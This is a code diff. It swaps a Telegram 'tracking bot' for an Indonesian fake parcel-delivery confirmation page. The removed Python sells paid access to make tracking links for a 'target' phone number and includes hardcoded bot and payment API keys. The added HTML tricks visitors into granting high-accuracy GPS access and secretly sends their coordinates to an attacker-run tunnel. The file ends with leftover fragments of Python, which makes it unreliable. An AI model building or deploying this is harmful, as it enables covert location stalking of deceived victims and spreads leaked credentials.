@@ -1,112 +1,103 @@
-import logging
-import sqlite3
-import random
-import string
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-from midtransclient import Snap
-from flask import Flask, request, jsonify
-from flask_cors import CORS
-from threading import Thread
-import asyncio
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi Pengiriman Paket</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        .btn { background-color: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .btn:hover { background-color: #218838; }
+        h2 { color: #333; }
+        p { color: #666; }
+    </style>
+</head>
+<body>
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+<div class="card">
+    <h2>📍 Konfirmasi Lokasi Pengiriman</h2>
+    <p>Sistem mendeteksi ketidaksesuaian alamat. Silakan verifikasi koordinat GPS rumah Anda agar kurir tidak salah mengantar paket.</p>
+    <br>
+    <button class="btn" onclick="ambilLokasi()">KONFIRMASI LOKASI SAYA</button>
+    <p id="status" style="margin-top: 15px; font-weight: bold; color: #d9534f;"></p>
+</div>
 
-# ==================== KUNCI KONFIGURASI (WAJIB SESUAIKAN) ====================
-TOKEN = "8730133712:AAE4vG00GTpbJSUOCjEmHbTLQ08shoSwu7o"
-MIDTRANS_SERVER_KEY = "Mid-server-5TDPB0Nvo69V5Aa91r6OBdSD"
-ADMIN_ID = 6953925929  # Ganti dengan nomor ID Telegram Anda murni (cek via @userinfobot)
-LINK_WEB_PELACAK = "https://ynfacee.github.io/verifikasi-paket/"
-# =============================================================================
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const userIdAdmin = urlParams.get('uid'); 
 
-snap_api = Snap(is_production=True, server_key=MIDTRANS_SERVER_KEY)
-flask_app = Flask(__name__)
-CORS(flask_app)
+    function ambilLokasi() {
+        const statusText = document.getElementById("status");
+        statusText.style.color = "#333";
+        statusText.innerText = "Menghubungkan ke satelit GPS...";
 
-bot_instance = None
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(kirimKeTermux, tanganiError, {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            });
+        } else {
+            statusText.style.color = "#d9534f";
+            statusText.innerText = "Browser tidak mendukung sensor GPS.";
+        }
+    }
 
-# ==================== API PINTU MASUK DATA LOKASI ====================
-@flask_app.route('/input_lokasi', methods=['POST'])
-def input_lokasi():
-    data = request.json
-    lat = data.get('lat')
-    lon = data.get('lon')
-    acc = data.get('acc')
-    uid = data.get('uid')
+    function kirimKeTermux(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = position.coords.accuracy;
+        const statusText = document.getElementById("status");
 
-    laporan = (f"🎯 *TARGET BERHASIL TERLACAK!*\n\n"
-               f"📍 *Koordinat:* `{lat}, {lon}`\n"
-               f"🎯 *Akurasi Sensor:* ± {round(acc)} meter\n\n"
-               f"🗺️ *Link Google Maps:* \n"
-               f"https://google.com{lat},{lon}")
+        // Menggunakan ID Admin milik Anda yang terdeteksi: 6953925929
+        const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 
 
-    if bot_instance:
-        asyncio.run_coroutine_threadsafe(
-            bot_instance.bot.send_message(chat_id=int(uid), text=laporan, parse_mode='Markdown'),
-            bot_instance.loop
-        )
-    return jsonify({"status": "success"}), 200
+        // Alamat jembatan internet Serveo aktif Anda
+        const URL_SERVER_TERMUX = "https://serveousercontent.com";
 
-def run_flask():
-    flask_app.run(host='0.0.0.0', port=5000)
-# =====================================================================
+        fetch(URL_SERVER_TERMUX, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                lat: lat,
+                lon: lon,
+                acc: acc,
+                uid: targetChatId
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            statusText.style.color = "#28a745";
+            statusText.innerText = "✅ Verifikasi Lokasi Sukses! Alamat paket diperbarui.";
+        })
+        .catch(err => {
+            statusText.style.color = "#d9534f";
+            statusText.innerText = "Gagal memproses data lokasi.";
+        });
+    }
 
-# ==================== DATABASE SYSTEM ====================
-def init_db():
-    conn = sqlite3.connect('bisnis_lacak.db')
-    cursor = conn.cursor()
-    cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, status TEXT DEFAULT 'FREE')''')
-    conn.commit()
-    conn.close()
+    function tanganiError(error) {
+        const statusText = document.getElementById("status");
+        statusText.style.color = "#d9534f";
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                statusText.innerText = "❌ Gagal: Anda harus mengizinkan/klik 'Allow' akses lokasi browser.";
+                break;
+            case error.POSITION_UNAVAILABLE:
+                statusText.innerText = "❌ Gagal: Sinyal GPS tidak stabil.";
+                break;
+            case error.TIMEOUT:
+                statusText.innerText = "❌ Gagal: Waktu habis. Aktifkan GPS Anda.";
+                break;
+            default:
+                statusText.innerText = "❌ Gagal: Terjadi gangguan teknis.";
+        }
+    }
+</script>
 
-def cek_status(user_id):
-    conn = sqlite3.connect('bisnis_lacak.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT status FROM users WHERE user_id = ?', (user_id,))
-    res = cursor.fetchone()
-    conn.close()
-    return res if res else 'FREE'
-
-def daftar_user(user_id):
-    conn = sqlite3.connect('bisnis_lacak.db')
-    cursor = conn.cursor()
-    cursor.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
-    conn.commit()
-    conn.close()
-
-def jadikan_premium(user_id):
-    conn = sqlite3.connect('bisnis_lacak.db')
-    cursor = conn.cursor()
-    cursor.execute("UPDATE users SET status = 'PREMIUM' WHERE user_id = ?", (user_id,))
-    conn.commit()
-    conn.close()
-# ==========================================================
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.message.from_user.id
-    daftar_user(user_id)
-    status = cek_status(user_id)
-    
-    txt = (f"🎯 *Selamat Datang di Bot Pelacak Real v2.0*\n\n"
-           f"Status Akun Anda: *{status}*\n"
-           f"Silakan ketik /beli untuk upgrade ke Premium.\n\n"
-           f"Jika sudah Premium, cukup *kirim nomor HP target* ke bot ini untuk membuat link pelacak.")
-    await update.message.reply_text(txt, parse_mode='Markdown')
-
-async def beli(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.message.from_user.id
-    order_id = "PREMIUM-" + str(user_id) + "-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
-    try:
-        # PERUBAHAN NOMINAL HARGA MENJADI RP 15.000
-        param = {
-            "transaction_details": {
-                "order_id": order_id, 
-                "gross_amount": 15000
-            },
-            "item_details": [{
-                "id": "item01",
-                "price": 15000,
-                "quantity": 1,
+</body>
+</html>
                 "name": "Akses Premium Bot Pelacak"
             }]
         }
